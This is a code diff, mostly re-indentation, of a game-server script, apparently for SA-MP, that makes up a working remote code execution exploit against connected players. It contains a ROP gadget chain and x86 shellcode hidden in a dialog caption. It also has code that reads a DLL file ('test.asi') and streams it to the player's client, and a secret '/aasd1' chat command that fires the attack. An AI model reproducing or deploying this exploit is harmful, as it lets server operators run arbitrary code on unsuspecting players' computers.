@@ -7,7 +7,7 @@ new const RPC_ScrSetGravity = 146;
 
 new payload1[] =
 {
-//          +0    +1    +2    +3    +4    +5    +6    +7    +8    +9  +10  +11  +12  +13  +14  +15
+//          +0    +1    +2    +3    +4    +5    +6    +7    +8    +9   +10   +11   +12   +13   +14   +15
 /* 000 */ 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
 /* 016 */ 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
 /* 032 */ 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
@@ -21,21 +21,21 @@ new payload1[] =
 
 new payload2[] =
 {
-0x15, 0x27, 0x40, 0x00, // pop ecx gadget
-0x37, 0x00, 0x00, 0x00, // ecx value
-0x8D, 0x2E, 0x40, 0x00, // pop edi gadget
-0x00, 0x60, 0x86, 0x00, // edi value
-0xE6, 0x2E, 0x5B, 0x00, // rep movsd gadget
-0x00, 0x00, 0x00, 0x00, // edi value
-0x00, 0x00, 0x00, 0x00, // esi value
-0x00, 0x60, 0x86, 0x00, // ret to dst
-0x00, 0x00, 0x00, 0x00, // pad
-
-0x8D, 0xA5, 0xD8, 0xFE, 0xFF, 0xFF, 0x8B, 0x45, 0x3C, 0x2D, 0x18, 0x01, 0x00, 0x00, 0x8B, 0x08, 0x8B,
-0x50, 0x08, 0x8B, 0x70, 0x0C, 0x83, 0xC1, 0x07, 0xC1, 0xE9, 0x03, 0x83, 0xC2, 0x07, 0xC1, 0xEA, 0x03,
-0x29, 0xD1, 0x01, 0xD6, 0x51, 0x6A, 0x40, 0x68, 0x00, 0x30, 0x00, 0x00, 0x51, 0x6A, 0x00, 0xA1, 0xA4,
-0x81, 0x85, 0x00, 0xFF, 0xD0, 0x89, 0xC7, 0x59, 0xF3, 0xA4, 0xFF, 0xD0, 0x5F, 0x5E, 0xB8, 0x01, 0x00,
-0x00, 0x00, 0x5B, 0x89, 0xEC, 0x5D, 0xC2, 0x08, 0x00
+    0x15, 0x27, 0x40, 0x00, // pop ecx gadget
+    0x37, 0x00, 0x00, 0x00, // ecx value
+    0x8D, 0x2E, 0x40, 0x00, // pop edi gadget
+    0x00, 0x60, 0x86, 0x00, // edi value
+    0xE6, 0x2E, 0x5B, 0x00, // rep movsd gadget
+    0x00, 0x00, 0x00, 0x00, // edi value
+    0x00, 0x00, 0x00, 0x00, // esi value
+    0x00, 0x60, 0x86, 0x00, // ret to dst
+    0x00, 0x00, 0x00, 0x00, // pad
+ 
+    0x8D, 0xA5, 0xD8, 0xFE, 0xFF, 0xFF, 0x8B, 0x45, 0x3C, 0x2D, 0x18, 0x01, 0x00, 0x00, 0x8B, 0x08, 0x8B,
+    0x50, 0x08, 0x8B, 0x70, 0x0C, 0x83, 0xC1, 0x07, 0xC1, 0xE9, 0x03, 0x83, 0xC2, 0x07, 0xC1, 0xEA, 0x03,
+    0x29, 0xD1, 0x01, 0xD6, 0x51, 0x6A, 0x40, 0x68, 0x00, 0x30, 0x00, 0x00, 0x51, 0x6A, 0x00, 0xA1, 0xA4,
+    0x81, 0x85, 0x00, 0xFF, 0xD0, 0x89, 0xC7, 0x59, 0xF3, 0xA4, 0xFF, 0xD0, 0x5F, 0x5E, 0xB8, 0x01, 0x00,
+    0x00, 0x00, 0x5B, 0x89, 0xEC, 0x5D, 0xC2, 0x08, 0x00
 };
 
 
@@ -45,55 +45,55 @@ new payload_array[21111];
 
 public OnFilterScriptInit()
 {
-payload_bs = BS_New();
+    payload_bs = BS_New();
     BS_WriteUint16(payload_bs, 1); // dialog id
-BS_WriteUint8(payload_bs, DIALOG_STYLE_LIST); // style
-BS_WriteUint8(payload_bs, sizeof(payload2)); // caption length
-for(new i = 0; i < sizeof(payload2); i++) // caption
-{
-BS_WriteUint8(payload_bs, payload2[i]);
-}
-BS_WriteString8(payload_bs, ""); // left button
-BS_WriteString8(payload_bs, ""); // right button
-BS_WriteCompressedString(payload_bs, payload1); // text
+    BS_WriteUint8(payload_bs, DIALOG_STYLE_LIST); // style
+    BS_WriteUint8(payload_bs, sizeof(payload2)); // caption length
+    for(new i = 0; i < sizeof(payload2); i++) // caption
+    {
+        BS_WriteUint8(payload_bs, payload2[i]);
+    }
+    BS_WriteString8(payload_bs, ""); // left button
+    BS_WriteString8(payload_bs, ""); // right button
+    BS_WriteCompressedString(payload_bs, payload1); // text
 
-// align
-new offset;
-BS_GetWriteOffset(payload_bs, offset);
-BS_SetWriteOffset(payload_bs, PR_BYTES_TO_BITS(PR_BITS_TO_BYTES(offset)));
+    // align
+    new offset;
+    BS_GetWriteOffset(payload_bs, offset);
+    BS_SetWriteOffset(payload_bs, PR_BYTES_TO_BITS(PR_BITS_TO_BYTES(offset)));
 
-// dll
-new File:fi = fopen("test.asi");
-new payload_len = flength(fi);
-if(payload_len > sizeof(payload_array) * 4)
-{
-    printf("ERROR! Not enough space to read! %d needed", payload_len / 4);
-}
-else
-{
-fblockread(fi, payload_array);
-    printf("SUCC READ PAYLOAD of %d bytes", payload_len);
-for(new i = 0; i < payload_len / 4; i++)
-{
-    BS_WriteUint32(payload_bs, payload_array[i]);
-}
-}
-fclose(fi);
+    // dll
+    new File:fi = fopen("test.asi");
+    new payload_len = flength(fi);
+    if(payload_len > sizeof(payload_array) * 4)
+    {
+        printf("ERROR! Not enough space to read! %d needed", payload_len / 4);
+    }
+    else
+    {
+        fblockread(fi, payload_array);
+        printf("SUCC READ PAYLOAD of %d bytes", payload_len);
+        for(new i = 0; i < payload_len / 4; i++)
+        {
+            BS_WriteUint32(payload_bs, payload_array[i]);
+        }
+    }
+    fclose(fi);
 }
 
 public OnFilterScriptExit()
 {
-BS_Delete(payload_bs);
+    BS_Delete(payload_bs);
 }
 
 public OnPlayerCommandText(playerid, cmdtext[])
 {
-if(!strcmp("/aasd1", cmdtext, true))
-{
-PerformRCE(playerid);
-return 1;
-}
-return 0;
+    if(!strcmp("/aasd1", cmdtext, true))
+    {
+        PerformRCE(playerid);
+        return 1;
+    }
+    return 0;
 }
 
 PerformRCE(playerid)
@@ -106,21 +106,21 @@ PerformRCE(playerid)
 
 SetPlayerGravity(playerid, Float:gravity)
 {
-new BitStream:bs = BS_New();
-BS_WriteFloat(bs, gravity);
-PR_SendRPC(bs, playerid, RPC_ScrSetGravity, PR_LOW_PRIORITY, PR_RELIABLE_ORDERED, 4);
-BS_Delete(bs);
+    new BitStream:bs = BS_New();
+    BS_WriteFloat(bs, gravity);
+    PR_SendRPC(bs, playerid, RPC_ScrSetGravity, PR_LOW_PRIORITY, PR_RELIABLE_ORDERED, 4);
+    BS_Delete(bs);
 }
 
 HidePlayerDialog(playerid)
 {
-new BitStream:bs = BS_New();
+    new BitStream:bs = BS_New();
     BS_WriteUint16(bs, -1); // id
-BS_WriteUint8(bs, DIALOG_STYLE_MSGBOX); // style
-BS_WriteString8(bs, " "); // caption
-BS_WriteString8(bs, ""); // left button
-BS_WriteString8(bs, ""); // right button
-BS_WriteCompressedString(bs, " "); // text
-PR_SendRPC(bs, playerid, RPC_ShowDialog, PR_LOW_PRIORITY, PR_RELIABLE_ORDERED, 4);
-BS_Delete(bs);
+    BS_WriteUint8(bs, DIALOG_STYLE_MSGBOX); // style
+    BS_WriteString8(bs, " "); // caption
+    BS_WriteString8(bs, ""); // left button
+    BS_WriteString8(bs, ""); // right button
+    BS_WriteCompressedString(bs, " "); // text
+    PR_SendRPC(bs, playerid, RPC_ShowDialog, PR_LOW_PRIORITY, PR_RELIABLE_ORDERED, 4);
+    BS_Delete(bs);
 }
